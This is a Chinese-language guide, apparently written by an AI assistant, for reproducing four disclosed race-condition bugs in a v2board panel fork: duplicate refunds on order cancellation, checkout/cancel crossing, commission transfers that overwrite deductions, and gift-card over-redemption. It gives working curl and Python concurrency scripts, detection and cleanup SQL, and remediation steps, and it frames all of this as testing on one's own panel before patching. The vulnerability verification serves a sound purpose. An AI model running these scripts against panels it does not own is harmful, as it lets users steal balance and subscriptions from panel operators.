# 订单竞态 / 余额漏洞 —— 复现验证文档

> 适用对象：`1kst/v2board`（wyx2685/v2board fork）线上快照。
> 用途：**在你自己拥有的面板上**验证上游 issue #374 披露的漏洞是否可复现，为修复提供依据。
> 依据：GitHub `wyx2685/v2board#374`（已公开披露），以及本仓库快照的逐行审计。

---

## 0. 先读这一段（安全边界，不是客套）

这些操作会真实改动数据库里的余额与订单。请务必：

1. **优先在 staging / 测试克隆环境跑**，而不是生产。要在生产验证，用**一个专门的测试账号**、**最小金额**（1 元、1 分佣金）、**业务低峰期**，并全程只操作该账号。
2. 每个场景都给了**检测 SQL**（跑之前先记录基线）和**清理 SQL**（跑完复位测试账号），别把测试数据留在库里。
3. **不要对不属于你的面板做这些操作** —— 那是入侵，不是测试。
4. 复现成功后**不要删除异常订单**再去修复；先留证、再打补丁。
5. 本文档只覆盖"在自己环境确认漏洞是否存在"，**不包含批量利用**。每个脚本都带并发上限与账号约束。

如果你只是想确认"要不要修" —— 答案是要修（审计已在你的代码上确认 4 条 CRITICAL）。本文档是给你"亲眼看到它发生"用的。

---

## 1. 环境与前置

| 项 | 值 |
|---|---|
| 认证 | `POST` body 里带 `auth_data`，或 HTTP 头 `Authorization`（见 `app/Http/Middleware/User.php:19`）。登录后浏览器 DevTools 的任意请求里都能抓到。 |
| API 前缀 | `/api/v1/user/...`（`prefix => 'user'`） |
| 限流 | **无**。`ThrottleRequests` 在 `Http/Kernel.php:67` 注册了但从未挂到任何路由。 |
| 并发模型 | Workerman + AdapterMan 常驻多进程（`webman.php`，worker = CPU×2），**真并行**，不是 FPM 单请求。这正是竞态能稳定触发的原因。 |
| 金额单位 | 数据库里 `total_amount` / `balance_amount` / `balance` 都是**分**（int）。100 元 = `10000`。 |

准备工作：
- 建一个测试账号，记下它的 `user_id`（下面 SQL 都用 `@uid`）。
- 给它充值一笔小额（如 100 元），或直接 `UPDATE v2_user SET balance=10000 WHERE id=@uid;`。
- 找一个价格 **低于** 该余额的套餐，记下 `plan_id` 和周期 `period`（如 `month_price`）。

```sql
SET @uid = 你的测试账号ID;
-- 基线：记录当前余额，跑完对比
SELECT id, email, balance, commission_balance FROM v2_user WHERE id = @uid;
```

一个通用的抓测试账号 auth 的方式：登录测试账号 → DevTools Network → 任意接口请求头里的 `Authorization` 值，存成 `$TOKEN`。

---

## 2. 场景一：订单取消竞态 → 余额重复退款（CRITICAL）

**原理**：`OrderService::cancel()`（`app/Services/OrderService.php:273`）用控制器传入的旧模型（`status=0`）进入事务，`$order->save()` 只生成 `WHERE id=?`、没有 `status` 前置条件。Eloquent 按"模型加载时的原始值"判脏，所以并发的每个取消请求都判定订单仍是待支付、都发出 UPDATE、都各自退一次款。行锁只把退款**串行化成多次都成功**，没有阻止第二次。

**攻击链**：
1. `POST /user/order/save`：余额 `B > 套餐价 P`，命中 `OrderController.php:173` 的 `$user->balance > 0 && $order->total_amount > 0 && $remainingBalance > 0` 分支 → 扣 P、写 `order.balance_amount=P, total_amount=0, status=0`。余额变 `B-P`。
2. 并发发出 N 个 `POST /user/order/cancel {trade_no}`。
3. N 个请求都在彼此提交前读到 `status=0`，`OrderController.php:305` 的 `$order->status !== 0` 守卫全部通过。
4. N 次退款全部落地 → 余额 = `B - P + N*P`，**净增 (N-1)*P**。
5. 取消后 `status=2`，`isNotCompleteOrderByUserId` 不再拦，可带着更大的余额循环放大。

**复现脚本**（bash + curl，N 路并发；把 `$TOKEN` / `$BASE` / `$PLAN` / `$PERIOD` 换成你的值）：

```bash
#!/usr/bin/env bash
set -euo pipefail
BASE="https://你的面板域名/api/v1/user"
TOKEN="测试账号的 Authorization"
PLAN=1            # 低于余额的套餐 id
PERIOD="month_price"
N=5              # 并发取消数，先用 5，别一上来就几十

auth() { curl -s -H "Authorization: $TOKEN" "$@"; }

# 1) 下一张会被余额全额抵扣的订单
TRADE=$(auth -X POST "$BASE/order/save" \
  -d "plan_id=$PLAN" -d "period=$PERIOD" | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"])')
echo "trade_no = $TRADE"

# 2) N 路并发取消同一订单
for i in $(seq 1 $N); do
  auth -X POST "$BASE/order/cancel" -d "trade_no=$TRADE" &
done
wait
echo "done, 查询余额对比基线"
```

**判定成功**：
```sql
SELECT balance FROM v2_user WHERE id = @uid;
-- 若 balance 比"下单后应有的 B-P"多出了 (N-1)*P（甚至等于或超过下单前的 B），即复现成功
SELECT trade_no, status, balance_amount, COUNT(*) FROM v2_order
WHERE user_id=@uid ORDER BY created_at DESC LIMIT 5;
```

> 现象往往不是每次都精确 N 倍 —— 取决于有多少请求真正并行进了窗口。只要余额比"取消一次"应得的多，就已经证明重复退款成立。多试几次、或把 N 调大一点即可稳定看到。

**清理**：
```sql
UPDATE v2_user SET balance = 10000 WHERE id = @uid;   -- 复位到测试基线
-- 删掉测试产生的订单（仅测试账号、仅本次测试的 trade_no）
DELETE FROM v2_order WHERE user_id=@uid AND created_at > UNIX_TIMESTAMP()-3600;
```

---

## 3. 场景二：checkout × cancel 交叉 → 白拿订阅并全额退款（CRITICAL）

**原理**：`OrderService::paid()`（`:257`）**完全没有事务**。`checkout` 的零金额分支（`OrderController.php:219` 的 `if ($order->total_amount <= 0)`）直接调 `paid()` 开通；同时 `cancel()` 退款。两条 UPDATE 都是 `where id=?`，副作用**各自落地**：订阅开了、余额也退回来了。

**攻击链**：同场景一先造出 `total_amount=0, balance_amount=P, status=0` 的订单，然后**同时**发：
- `POST /user/order/checkout {trade_no}` → 命中零金额分支 → `paid()` → 开通订阅
- `POST /user/order/cancel {trade_no}` → 退回 P

**复现脚本**（接场景一的 `$TRADE`）：
```bash
auth -X POST "$BASE/order/checkout" -d "trade_no=$TRADE" &
auth -X POST "$BASE/order/cancel"   -d "trade_no=$TRADE" &
wait
```

**判定成功**：
```sql
-- 订阅到手（plan_id/expired_at 被写入）同时余额被退回
SELECT id, plan_id, expired_at, balance FROM v2_user WHERE id=@uid;
SELECT trade_no, status FROM v2_order WHERE user_id=@uid ORDER BY created_at DESC LIMIT 3;
```
若用户 `plan_id/expired_at` 被开通、而 `balance` 又回到了下单前 —— 复现成功。命中率低于场景一（窗口更窄），失败就重试。

**清理**：复位 `balance`、清掉测试订单，并把测试账号的 `plan_id/expired_at/transfer_enable` 手工恢复原值。

---

## 4. 场景三：佣金划转覆盖带锁扣款 → 1 分佣金换任意订阅（CRITICAL）

**原理**：`transfer()`（`UserController.php:431`）在事务外读 `$user`（旧余额快照），事务内 `$user->balance = $user->balance + x; save()` 写**绝对值**。若此间有一笔带锁扣款提交，`transfer` 的 save 会用陈旧快照把扣款**抹掉**。

**攻击链**（余额 `B=10000`，佣金 `commission_balance>=1`）：
- T0 `POST /user/transfer {transfer_amount:1}`：在 `:412` 读到 `balance=10000`（无锁、事务外）。
- T1 `POST /user/order/save`：进入事务 `addBalance(-10000)`（FOR UPDATE），余额变 0，写 `order.balance_amount=10000, total_amount=0`，提交。
- T2 `transfer` 的 `save()` 阻塞后执行：`SET balance=10001` —— **用 T0 的旧值覆盖，10000 的扣款凭空消失**。
- T3 `checkout` 命中零金额分支开通订阅。
- 净结果：拿到 100 元订阅，余额还剩 10001。

窗口很宽（`transfer` 的读写之间隔着 Order insert + `setInvite` 的多条 SQL），毫秒级，失败可重放。

**复现脚本**（两路并发，反复几次直到命中）：
```bash
# 先确保测试账号有 >=1 分佣金：UPDATE v2_user SET commission_balance=100 WHERE id=@uid;（1元佣金）
auth -X POST "$BASE/transfer"   -d "transfer_amount=1" &
auth -X POST "$BASE/order/save" -d "plan_id=$PLAN" -d "period=$PERIOD" &
wait
```

**判定成功**：
```sql
SELECT balance, commission_balance FROM v2_user WHERE id=@uid;
-- 若下单已扣款、但 balance 仍约等于下单前（扣款被 transfer 覆盖），即复现
```

**清理**：`UPDATE v2_user SET balance=10000, commission_balance=0 WHERE id=@uid;` + 清测试订单。

---

## 5. 场景四：礼品卡并发兑换绕过次数限制（CRITICAL）

**原理**：`redeemgiftcard()`（`UserController.php:167`）对 `limit_use` / `used_user_ids` 是无锁的 read-modify-write（check-then-act），礼品卡行未 `lockForUpdate`。

**两种复现**：
- **跨账号突破次数**：`limit_use=1` 的卡，用 K 个不同测试账号**同时** `POST /user/redeemgiftcard {giftcard: 卡号}`。K 个请求都读到 `limit_use=1` 通过、都写 `0`，K 个不同用户行各自到账全额 —— 单次卡被用了 K 次。
- **单账号复兑**：账号 U 与同伙 V 并发兑换同一张卡 → `used_user_ids` 被后写者覆盖、`limit_use` 只扣 1 次 → U 的 id 从名单消失 → U 再串行兑换一次又能到账。

**复现脚本**（跨账号版，需要 2~3 个测试账号的 token）：
```bash
CARD="测试礼品卡卡号"   # 建一张 limit_use=1、value=100(1元) 的卡
for T in "$TOKEN_A" "$TOKEN_B" "$TOKEN_C"; do
  curl -s -H "Authorization: $T" -X POST "$BASE/redeemgiftcard" -d "giftcard=$CARD" &
done
wait
```

**判定成功**：
```sql
SELECT code, limit_use, used_user_ids FROM v2_giftcard WHERE code='测试卡号';
-- limit_use 变成负数，或 used_user_ids 里的账号数 < 实际到账账号数 → 复现
SELECT id, balance FROM v2_user WHERE id IN (账号A,账号B,账号C);
-- 多个账号都到账了全额 → 单次卡被多次消费
```

**清理**：删除测试礼品卡、复位相关账号余额。

---

## 6. 复现失败怎么办（不代表安全）

竞态是概率性的，一次没中不等于不存在。按顺序排查：

1. **加大并发 N**（场景一从 5 提到 10~20）。
2. **确认真并行**：`ps aux | grep -c '[w]ebman'` 应看到多个 worker 进程；单 worker（或被反代串行化）会掩盖竞态。
3. **确认没有前置限流**：若你已按之前建议在 Nginx 层加了限流，先临时去掉再测。
4. **场景一/三窗口最宽、最容易中**，先用它们证明"竞态确实存在"，再回头试窗口窄的场景二。
5. curl 的 `&` 启动本身有微小先后差；要更同步可以用 `xargs -P` 或写个小 Go/Python 脚本让 N 个请求在同一屏障后同时发出。下面给一个更可靠的 Python 版：

```python
# repro_cancel.py  —— 用线程屏障让 N 个取消请求尽可能同时到达
import threading, requests, sys
BASE="https://你的域名/api/v1/user"; TOKEN="..."; TRADE=sys.argv[1]; N=int(sys.argv[2] if len(sys.argv)>2 else 8)
h={"Authorization":TOKEN}; barrier=threading.Barrier(N)
def go():
    barrier.wait()
    requests.post(f"{BASE}/order/cancel", headers=h, data={"trade_no":TRADE})
ts=[threading.Thread(target=go) for _ in range(N)]
[t.start() for t in ts]; [t.join() for t in ts]
print("done")
```

---

## 7. 复现之后

确认任一场景可复现，就说明这套代码在你的生产上是可被利用的。接下来：

1. **先取证**：用之前给的筛查 SQL 找是否已有真实攻击痕迹（大量 `status=2` 订单、零金额成功订单、余额对不上账的账号），**别删数据**。
2. **止血**（不改代码）：临时关闭余额抵扣下单 / 暂停礼品卡与佣金划转 / 给这几个接口加互斥。
3. **打补丁**：核心是把「状态迁移 + 余额变更 + 记账」变成同一个原子、幂等的数据库操作。P0 四条 CRITICAL 必须同批上线（`cancel()` CAS、`paid()` 事务化、`open()` 加锁复查、礼品卡行锁、`transfer()` 原子写）。补丁设计已逐条经对抗验证，需要时我可以直接落地并附并发测试脚本。

---

## 附：一次性基线 + 清理模板

```sql
-- 测试前基线快照
SET @uid = 测试账号ID;
SELECT NOW() AS t, balance, commission_balance, plan_id, expired_at
FROM v2_user WHERE id=@uid;

-- 测试后一键复位（按需调整数值）
UPDATE v2_user SET balance=10000, commission_balance=0 WHERE id=@uid;
DELETE FROM v2_order WHERE user_id=@uid AND created_at > UNIX_TIMESTAMP()-7200;
```
